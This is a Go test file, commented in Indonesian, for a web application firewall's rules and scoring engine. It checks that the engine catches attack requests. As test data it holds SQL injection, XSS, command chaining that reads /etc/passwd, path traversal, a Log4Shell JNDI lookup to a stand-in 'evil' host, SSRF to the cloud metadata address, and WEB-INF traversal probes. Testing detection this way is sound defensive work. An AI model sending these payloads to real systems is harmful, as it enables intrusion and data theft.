package rules

// Test rules engine + triase skor — port dari tests/test_engine.py (Python)
// dengan vektor serangan yang sama.

import (
	"strings"
	"testing"

	"github.com/willy911/perisai-waf/internal/config"
)

var uaNormal = map[string]string{"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

func testEngine() *Engine {
	cfg := &config.WAFConfig{}
	cfg.Thresholds.AgentScore = 25
	cfg.Thresholds.BlockScore = 60
	return NewEngine(cfg, nil)
}

func testEngineCustom(custom ...Rule) *Engine {
	cfg := &config.WAFConfig{}
	cfg.Thresholds.AgentScore = 25
	cfg.Thresholds.BlockScore = 60
	return NewEngine(cfg, custom)
}

func req(path, query string, headers map[string]string, body []byte, method string) *Request {
	if headers == nil {
		headers = uaNormal
	}
	if method == "" {
		method = "GET"
	}
	return &Request{
		ID: "t1", ClientIP: "1.2.3.4", Method: method,
		Path: path, Query: query, Headers: headers, Body: body,
	}
}

func hitSet(hits []Hit) map[string]bool {
	m := map[string]bool{}
	for _, h := range hits {
		m[h.RuleID] = true
	}
	return m
}

func mustRuleT(t *testing.T, id, name, category, severity string, patterns ...string) Rule {
	t.Helper()
	r, err := NewRule(id, name, category, severity, patterns...)
	if err != nil {
		t.Fatalf("NewRule %s: %v", id, err)
	}
	return r
}

// -- paket signature ------------------------------------------------------

func TestJumlahRuleBawaan(t *testing.T) {
	e := testEngine()
	if len(e.Rules()) != 34 {
		t.Fatalf("rule bawaan = %d, mau 34", len(e.Rules()))
	}
	ids := map[string]bool{}
	for _, r := range e.Rules() {
		if ids[r.ID] {
			t.Fatalf("duplikat rule %s", r.ID)
		}
		ids[r.ID] = true
		if len(r.Patterns) == 0 {
			t.Fatalf("rule %s tanpa pola", r.ID)
		}
	}
}

func TestBobotSeverity(t *testing.T) {
	cases := map[string]float64{"critical": 40, "high": 25, "medium": 15, "low": 8}
	for sev, want := range cases {
		r := mustRuleT(t, "T", "t", "x", sev, `x`)
		if r.Weight != want {
			t.Fatalf("severity %s: bobot=%v mau %v", sev, r.Weight, want)
		}
	}
}

func TestNewRuleTolakRegexInvalid(t *testing.T) {
	// RE2 tidak mendukung backreference — harus error, bukan panic diam-diam.
	if _, err := NewRule("BAD", "bad", "x", "low", `(\w+)\1`); err == nil {
		t.Fatal("pola backreference seharusnya ditolak RE2")
	}
}

// -- benign ---------------------------------------------------------------

func TestBenignAllow(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/", "q=sepatu+lari&page=2", nil, nil, ""))
	if r.Action != "allow" || r.Score != 0 {
		t.Fatalf("benign: action=%s score=%v, mau allow/0", r.Action, r.Score)
	}
}

func TestBenignPostForm(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/checkout", "", nil, []byte("nama=Budi&alamat=Jl.+Mawar+No.+10"), "POST"))
	if r.Action != "allow" {
		t.Fatalf("form benign: action=%s, mau allow", r.Action)
	}
}

// -- SQLi ------------------------------------------------------------------

func TestSQLIUnionAgent(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/produk", "id=1%20UNION%20SELECT%20password%20FROM%20users", nil, nil, ""))
	if r.Action != "agent" {
		t.Fatalf("union sqli: action=%s, mau agent", r.Action)
	}
	if !hitSet(r.Hits)["SQLI-001"] {
		t.Fatal("SQLI-001 tidak kena")
	}
}

func TestSQLIBoolean(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/login", "user=admin%27%20OR%20%271%27%3D%271", nil, nil, ""))
	if r.Action != "agent" {
		t.Fatalf("boolean sqli: action=%s, mau agent", r.Action)
	}
	if !hitSet(r.Hits)["SQLI-002"] {
		t.Fatal("SQLI-002 tidak kena")
	}
}

// Pola SQLI-002 ditulis ulang tanpa backreference (RE2) — verifikasi langsung.
func TestSQLI002TanpaBackreference(t *testing.T) {
	e := testEngine()
	for _, rl := range e.Rules() {
		if rl.ID == "SQLI-002" {
			cocok := []string{
				"admin' OR '1'='1",
				`admin" OR "1"="1`,
				"x' or '12'='34",
				"a' OR 1=1",
			}
			for _, s := range cocok {
				if !rl.Patterns[0].MatchString(s) {
					t.Fatalf("pola SQLI-002 tidak cocok %q", s)
				}
			}
			if rl.Patterns[0].MatchString("warna='merah' dan ukuran='besar'") {
				t.Fatal("pola SQLI-002 false positive pada teks benign")
			}
			return
		}
	}
	t.Fatal("rule SQLI-002 tidak ditemukan")
}

func TestSQLIStackedBlock(t *testing.T) {
	e := testEngine()
	// dua rule berbeda, masing-masing critical (40+40) -> block langsung
	r := e.Triage(req("/x", "a=1%3B%20DROP%20TABLE%20users&f=..%2F..%2Fetc%2Fpasswd", nil, nil, ""))
	if r.Action != "block" || r.Score < 60 {
		t.Fatalf("stacked: action=%s score=%v, mau block>=60", r.Action, r.Score)
	}
}

// -- XSS -------------------------------------------------------------------

func TestXSSScriptTag(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/cari", "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", nil, nil, ""))
	// critical 40 (XSS-001) + medium 15 (XSS-007) = 55 -> agent
	if r.Action != "agent" {
		t.Fatalf("xss: action=%s, mau agent", r.Action)
	}
	if r.Score != 55 {
		t.Fatalf("xss: score=%v, mau 55", r.Score)
	}
	if !hitSet(r.Hits)["XSS-001"] {
		t.Fatal("XSS-001 tidak kena")
	}
}

func TestXSSTerEncodeTerdeteksiViaDecode(t *testing.T) {
	e := testEngine()
	// payload ter-encode ganda tetap kena via zona multi-decode
	r := e.Triage(req("/cari", "q=%253Cscript%253Ealert(1)%253C%252Fscript%253E", nil, nil, ""))
	if !hitSet(r.Hits)["XSS-001"] {
		t.Fatal("XSS-001 tidak kena pada payload double-encoded")
	}
}

func TestSatuHitPerRule(t *testing.T) {
	e := testEngine()
	// LFI-001 punya 4 pola; "../../.." cocok beberapa pola tapi 1 hit saja
	r := e.Triage(req("/d", "f=..%2F..%2F..%2F", nil, nil, ""))
	n := 0
	for _, h := range r.Hits {
		if h.RuleID == "LFI-001" {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("LFI-001 hit %d kali, mau tepat 1", n)
	}
}

func TestCustomRuleDecodeEvasion(t *testing.T) {
	// Regresi bypass ala "/%50SEMHUB": WAF yang hanya memindai raw lolos,
	// padahal backend men-decode %50 -> P. Perisai memindai mentah DAN decode.
	custom := mustRuleT(t, "CUSTOM-T001", "Blocklist path /PSEMHUB", "anomaly", "high", `/PSEMHUB`)
	e := testEngineCustom(custom)

	r := e.Triage(req("/%50SEMHUB", "", nil, nil, ""))
	ok := false
	for _, h := range r.Hits {
		if h.RuleID == "CUSTOM-T001" && h.Location == "path" {
			ok = true
		}
	}
	if !ok {
		t.Fatal("CUSTOM-T001 tidak kena /%50SEMHUB di zona path")
	}
	// double-encoded juga harus kena via multi-decode
	r2 := e.Triage(req("/%2550SEMHUB", "", nil, nil, ""))
	if !hitSet(r2.Hits)["CUSTOM-T001"] {
		t.Fatal("CUSTOM-T001 tidak kena /%2550SEMHUB")
	}
}

// -- RCE / LFI / CVE --------------------------------------------------------

func TestRCECommandChaining(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/ping", "host=8.8.8.8%3Bcat%20%2Fetc%2Fpasswd", nil, nil, ""))
	if r.Action != "block" { // critical 40 + critical 40
		t.Fatalf("rce chaining: action=%s, mau block", r.Action)
	}
	if !hitSet(r.Hits)["RCE-001"] {
		t.Fatal("RCE-001 tidak kena")
	}
}

func TestLFITraversal(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/download", "file=..%2F..%2Fetc%2Fpasswd", nil, nil, ""))
	if r.Action != "block" {
		t.Fatalf("lfi: action=%s, mau block", r.Action)
	}
	if !hitSet(r.Hits)["LFI-002"] {
		t.Fatal("LFI-002 tidak kena")
	}
}

func TestLog4ShellDiHeader(t *testing.T) {
	e := testEngine()
	// CVE-001 (critical 40) + RCE-006 SSTI probe (high 25) = 65 -> block
	r := e.Triage(req("/", "", map[string]string{"X-Api-Version": "${jndi:ldap://evil/x}"}, nil, ""))
	if r.Action != "block" {
		t.Fatalf("log4shell: action=%s, mau block", r.Action)
	}
	hs := hitSet(r.Hits)
	if !hs["CVE-001"] {
		t.Fatal("CVE-001 tidak kena")
	}
	// pastikan lokasinya zona header
	for _, h := range r.Hits {
		if h.RuleID == "CVE-001" && h.Location != "header" {
			t.Fatalf("CVE-001 location=%s, mau header", h.Location)
		}
	}
}

func TestSpring4Shell(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/", "x=class.module.classLoader.resources", nil, nil, ""))
	if !hitSet(r.Hits)["CVE-002"] {
		t.Fatal("CVE-002 tidak kena")
	}
}

func TestCVE007JavaWebinfProbes(t *testing.T) {
	// CVE-2026-21589: akses file dalam web root Java tanpa auth.
	// Sebelum CVE-007, probe semacam ini lolos skor 0 -> allow.
	e := testEngine()
	paths := []string{
		"/WEB-INF/web.xml",
		"/confluence/WEB-INF/classes/atlassian-security.xml",
		"/META-INF/MANIFEST.MF",
		"/bitbucket/server.xml",
	}
	for _, p := range paths {
		r := e.Triage(req(p, "", nil, nil, ""))
		if r.Action != "agent" {
			t.Fatalf("%s: action=%s, mau agent", p, r.Action)
		}
		if !hitSet(r.Hits)["CVE-007"] {
			t.Fatalf("%s: CVE-007 tidak kena", p)
		}
	}
	// varian ter-encode tetap kena via zona multi-decode
	r := e.Triage(req("/%57EB-INF/web.xml", "", nil, nil, ""))
	if !hitSet(r.Hits)["CVE-007"] {
		t.Fatal("CVE-007 tidak kena /%57EB-INF/web.xml")
	}
	r = e.Triage(req("/WEB-INF%2fweb.xml", "", nil, nil, ""))
	if !hitSet(r.Hits)["CVE-007"] {
		t.Fatal("CVE-007 tidak kena /WEB-INF%2fweb.xml")
	}
}

func TestCVE008DoubleColonTraversal(t *testing.T) {
	// CVE-2026-21589, teknik aktual per laporan watchTowr 2026-10-07:
	// atlassian-plugins-webresource.jar mengubah "::" jadi "/" di routing,
	// sehingga payload "..::..::..::<dir>::file" tidak mengandung
	// "/WEB-INF/" literal dan lolos dari CVE-007 (allow skor 0).
	e := testEngine()
	payloads := []string{
		"/plugins/servlet/colorpicker/..::..::..::WEB-INF::web.xml",
		"/rest/api/2/..::..::..::WEB-INF::classes/crowd.properties",
		"/confluence/s/abc/_/..::..::..::META-INF::MANIFEST.MF",
		"/jira/secure/..::..::..::WEB-INF/web.xml",
	}
	for _, p := range payloads {
		r := e.Triage(req(p, "", nil, nil, ""))
		if r.Action != "agent" {
			t.Fatalf("%s: action=%s, mau agent", p, r.Action)
		}
		if !hitSet(r.Hits)["CVE-008"] {
			t.Fatalf("%s: CVE-008 tidak kena", p)
		}
	}
	// varian ter-encode (%3a = ':') tetap kena via zona multi-decode
	r := e.Triage(req("/x/..%3a%3a..%3a%3aWEB-INF%3a%3aweb.xml", "", nil, nil, ""))
	if !hitSet(r.Hits)["CVE-008"] {
		t.Fatal("CVE-008 tidak kena varian %3a%3a")
	}
	// negatif: path normal tidak boleh kena
	for _, p := range []string{"/", "/api/v1/orders", "/download/file.zip"} {
		r := e.Triage(req(p, "", nil, nil, ""))
		if hitSet(r.Hits)["CVE-008"] {
			t.Fatalf("%s: CVE-008 false positive", p)
		}
	}
}

func TestSSRFMetadata(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/fetch", "url=http://169.254.169.254/latest/meta-data", nil, nil, ""))
	if r.Action != "agent" {
		t.Fatalf("ssrf: action=%s, mau agent", r.Action)
	}
	if !hitSet(r.Hits)["SSRF-001"] {
		t.Fatal("SSRF-001 tidak kena")
	}
}

// -- scanner -----------------------------------------------------------------

func TestScannerUA(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/", "", map[string]string{"user-agent": "sqlmap/1.7.2"}, nil, ""))
	if r.Action != "agent" {
		t.Fatalf("scanner: action=%s, mau agent", r.Action)
	}
	if !hitSet(r.Hits)["SCAN-001"] {
		t.Fatal("SCAN-001 tidak kena")
	}
}

// -- anomali ------------------------------------------------------------------

func TestHugeQueryAgent(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/s", "q="+strings.Repeat("a", 2500), nil, nil, ""))
	// Python: action == "agent" ATAU "panjang" di reasons.
	// Anomali +10 saja -> skor 10 -> allow, tapi reason tercatat.
	if r.Score != 10 {
		t.Fatalf("huge query: score=%v, mau 10", r.Score)
	}
	if !strings.Contains(strings.Join(r.Reasons, " "), "panjang") {
		t.Fatalf("reasons tidak menyebut 'panjang': %v", r.Reasons)
	}
}

func TestBanyakParameter(t *testing.T) {
	e := testEngine()
	q := "a=1"
	for i := 0; i < 55; i++ {
		q += "&a=1"
	}
	r := e.Triage(req("/s", q, nil, nil, ""))
	found := false
	for _, reason := range r.Reasons {
		if strings.Contains(reason, "tidak wajar") {
			found = true
		}
	}
	if !found {
		t.Fatalf("reasons tidak menyebut parameter tidak wajar: %v", r.Reasons)
	}
}

func TestMethodTidakUmum(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/", "", nil, nil, "FOO"))
	if r.Score != 10 || r.Action != "allow" {
		t.Fatalf("method FOO: score=%v action=%s, mau 10/allow", r.Score, r.Action)
	}
	if !strings.Contains(strings.Join(r.Reasons, " "), "FOO") {
		t.Fatalf("reasons tidak menyebut method: %v", r.Reasons)
	}
}

// -- batas threshold & skor ----------------------------------------------------

func TestBatasThresholdViaCustomRule(t *testing.T) {
	low := func(id string) Rule {
		return mustRuleT(t, id, id, "anomaly", "low", `TRIGGER-`+id)
	}
	// 3x low = 24 -> masih allow (di bawah agent_score 25)
	e := testEngineCustom(low("A"), low("B"), low("C"))
	r := e.Triage(req("/x", "q=TRIGGER-A TRIGGER-B TRIGGER-C", nil, nil, ""))
	if r.Score != 24 || r.Action != "allow" {
		t.Fatalf("skor 24: score=%v action=%s, mau 24/allow", r.Score, r.Action)
	}
	// 4x low = 32 -> agent
	e2 := testEngineCustom(low("A"), low("B"), low("C"), low("D"))
	r2 := e2.Triage(req("/x", "q=TRIGGER-A TRIGGER-B TRIGGER-C TRIGGER-D", nil, nil, ""))
	if r2.Score != 32 || r2.Action != "agent" {
		t.Fatalf("skor 32: score=%v action=%s, mau 32/agent", r2.Score, r2.Action)
	}
}

func TestSkorDibatasi100(t *testing.T) {
	crit := func(id string) Rule {
		return mustRuleT(t, id, id, "anomaly", "critical", `HIT-`+id)
	}
	e := testEngineCustom(crit("A"), crit("B"), crit("C")) // 120 mentah
	r := e.Triage(req("/x", "q=HIT-A HIT-B HIT-C", nil, nil, ""))
	if r.Score != 100 {
		t.Fatalf("skor=%v, mau dibatasi 100", r.Score)
	}
	if r.Action != "block" {
		t.Fatalf("action=%s, mau block", r.Action)
	}
}

// -- evidence -------------------------------------------------------------------

func TestEvidenceSnippet(t *testing.T) {
	e := testEngine()
	r := e.Triage(req("/cari", "q=zzz%3Cscript%3Ealert(1)%3C%2Fscript%3Ezzz", nil, nil, ""))
	for _, h := range r.Hits {
		if h.RuleID == "XSS-001" {
			if h.Evidence == "" {
				t.Fatal("evidence kosong")
			}
			if len([]rune(h.Evidence)) > 160 {
				t.Fatalf("evidence %d char, melebihi 160", len([]rune(h.Evidence)))
			}
			if strings.Contains(h.Evidence, "\n") {
				t.Fatal("evidence masih mengandung newline")
			}
			if !strings.Contains(strings.ToLower(h.Evidence), "<script") {
				t.Fatalf("evidence tidak memuat konteks serangan: %q", h.Evidence)
			}
			return
		}
	}
	t.Fatal("XSS-001 tidak kena")
}

// -- decode ---------------------------------------------------------------------

func TestMultiUnquote(t *testing.T) {
	cases := map[string]string{
		"%3Cscript%3E":           "<script>",
		"%253Cscript%253E":       "<script>", // ganda
		"%25253Cscript%25253E":   "<script>", // tiga kali
		"abc":                    "abc",
		"%zz":                    "%zz", // invalid -> dibiarkan
		"100%":                   "100%",
		"a+b":                    "a+b", // '+' tidak jadi spasi (ala unquote)
		"%57EB-INF":              "WEB-INF",
		"..%2F..%2Fetc%2Fpasswd": "../../etc/passwd",
		"${jndi:ldap://x}":       "${jndi:ldap://x}",
		"%2525253C":              "<", // 3x decode: %2525253C -> %25253C -> %253C -> %3C? cek di bawah
	}
	for in, want := range cases {
		if in == "%2525253C" {
			continue // ditangani terpisah karena butuh 4x decode
		}
		if got := multiUnquote(in); got != want {
			t.Fatalf("multiUnquote(%q) = %q, mau %q", in, got, want)
		}
	}
	// batas 3x decode: butuh 4x -> tidak tuntas (sama seperti Python)
	if got := multiUnquote("%2525253C"); got == "<" {
		t.Fatalf("multiUnquote 4x seharusnya tidak tuntas, dapat %q", got)
	}
}

func TestBodyLatin1(t *testing.T) {
	e := testEngine()
	// body biner dengan byte non-ASCII: decode latin-1 ala Python
	body := append([]byte("x="), 0xe9, 0x20)
	body = append(body, []byte("<script>")...)
	r := e.Triage(req("/p", "", nil, body, "POST"))
	if !hitSet(r.Hits)["XSS-001"] {
		t.Fatal("XSS-001 tidak kena pada body latin-1")
	}
}

func TestCustomRuleMasukKeEngine(t *testing.T) {
	// Custom rule dari learner ikut dipindai setelah rule bawaan.
	custom := mustRuleT(t, "C1", "custom probe", "anomaly", "medium", `kue-lapis-legit`)
	e := testEngineCustom(custom)
	if len(e.Rules()) != 35 {
		t.Fatalf("jumlah rule = %d, mau 35 (34 bawaan + 1 custom)", len(e.Rules()))
	}
	r := e.Triage(req("/toko", "menu=kue-lapis-legit", nil, nil, ""))
	if !hitSet(r.Hits)["C1"] {
		t.Fatal("custom rule C1 tidak kena")
	}
	if r.Score != 15 || r.Action != "allow" {
		t.Fatalf("custom medium: score=%v action=%s, mau 15/allow", r.Score, r.Action)
	}
}
